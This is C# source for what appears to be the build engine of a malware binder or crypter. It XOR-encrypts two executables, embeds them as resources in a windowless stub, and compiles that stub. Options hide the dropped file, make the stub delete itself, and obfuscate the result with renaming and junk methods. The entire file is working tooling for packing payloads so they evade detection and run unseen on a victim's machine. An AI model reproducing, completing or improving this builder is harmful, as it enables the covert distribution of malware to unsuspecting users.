﻿using dnlib.DotNet;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.IO;

namespace Builder.ModulesBuilder
{
    internal class BuildEngine
    {
        public static void CompileStub(string outputExePath, string file1Path, string file2Path, string dropPath, bool hideFile, bool obfuscator, bool selfdelete)
        {
            string xorKey = EncryptEngine.GenerateRandomStr(32);
            string app1 = EncryptEngine.GenerateRandomStr(12);
            string app2 = EncryptEngine.GenerateRandomStr(14);

            try
            {
                if (!File.Exists(file1Path) || !File.Exists(file2Path))
                {
                    throw new FileNotFoundException("One or more files were not found.");
                }

                EncryptEngine.EncryptFileAndSave(file1Path, xorKey, app1);
                EncryptEngine.EncryptFileAndSave(file2Path, xorKey, app2);

                string stubSourceCode = Properties.Resources.stub;
                stubSourceCode = ReplaceStubVariables(stubSourceCode, xorKey, dropPath, file1Path, file2Path, app1, app2);

                CompilerParameters compilerParams = ConfigureCompiler(outputExePath, hideFile, selfdelete);

                AddResource(compilerParams, app1);
                AddResource(compilerParams, app2);

                CompileSource(stubSourceCode, compilerParams, outputExePath);
                if (obfuscator && File.Exists(outputExePath))
                {
                    ApplyObfuscation(outputExePath);
                }
            }

            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }

            finally
            {
                TempCleaner(app1, app2);
            }
        }

        private static string ReplaceStubVariables(string stubSourceCode, string xorKey, string dropPath, string file1Path, string file2Path, string app1, string app2)
        {
            try
            {
                stubSourceCode = stubSourceCode.Replace("%Key%", xorKey)
                                               .Replace("%PathToDrop%", dropPath)
                                               .Replace("%exe1_name%", EncryptEngine.StringEncryptor(Path.GetFileName(file1Path), xorKey))
                                               .Replace("%exe2_name%", EncryptEngine.StringEncryptor(Path.GetFileName(file2Path), xorKey))
                                               .Replace("%exe1_resource_name%", app1)
                                               .Replace("%exe2_resource_name%", app2);
                return stubSourceCode;
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException("Error to configuration stub.", ex);
            }
        }

        private static CompilerParameters ConfigureCompiler(string outputExePath, bool hideFile, bool selfdelete)
        {
            try
            {
                CompilerParameters compilerParams = new CompilerParameters
                {
                    GenerateExecutable = true,
                    OutputAssembly = outputExePath,
                    CompilerOptions = "/target:winexe",
                    IncludeDebugInformation = false,
                    ReferencedAssemblies =
                    {
                        "System.dll",
                        "System.Core.dll",
                    }
                };

                if (hideFile)
                {
                    compilerParams.CompilerOptions += " /define:HideFile";
                }

                if (selfdelete)
                {
                    compilerParams.CompilerOptions += " /define:SelfRemove";
                }

                return compilerParams;
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException("Error configuring compiler.", ex);
            }
        }

        private static void AddResource(CompilerParameters compilerParams, string filePath)
        {
            if (File.Exists(filePath))
            {
                compilerParams.EmbeddedResources.Add(filePath);
            }
            else
            {
                throw new FileNotFoundException($"Resource not found: {filePath}");
            }
        }

        private static void CompileSource(string stubSourceCode, CompilerParameters compilerParams, string outputExePath)
        {
            using (CSharpCodeProvider codeProvider = new CSharpCodeProvider())
            {
                CompilerResults compileResult = codeProvider.CompileAssemblyFromSource(compilerParams, stubSourceCode);

                if (compileResult.Errors.Count > 0)
                {
                    foreach (CompilerError error in compileResult.Errors)
                    {
                        Console.WriteLine($"Error {error.ErrorNumber}: {error.ErrorText}");
                    }
                    throw new InvalidOperationException("Compilation have errors.");
                }
                else
                {
                    Console.WriteLine($"Build successfull: {outputExePath}");
                }
            }
        }

        private static void ApplyObfuscation(string outputExePath)
        {
            string directory = Path.GetDirectoryName(outputExePath);
            string originalFileName = Path.GetFileName(outputExePath);
            string moduleNew = Path.Combine(directory, $"sample_{originalFileName}");

            try
            {
                File.Copy(outputExePath, moduleNew, overwrite: true);
                using (ModuleDef module = ModuleDefMD.Load(moduleNew))
                {
                    ObfuscateEngine.RenameProtector.Execute(module);
                    ObfuscateEngine.JunkMethods.Execute(module);
                    module.Write(outputExePath);
                }

                Console.WriteLine("Obfuscation successful.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error at obfuscation: {ex.Message}");
            }
            finally
            {
                if (File.Exists(moduleNew))
                {
                    try
                    {
                        File.Delete(moduleNew);
                    }
                    catch (IOException ioEx)
                    {
                        Console.WriteLine($"Unable to delete file {moduleNew}: {ioEx.Message}");
                    }
                }
            }
        }

        private static void TempCleaner(string file1, string file2)
        {
            try
            {
                if (File.Exists(file1)) File.Delete(file1);
                if (File.Exists(file2)) File.Delete(file2);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error at deleteing temporary files: {ex.Message}");
            }
        }
    }
}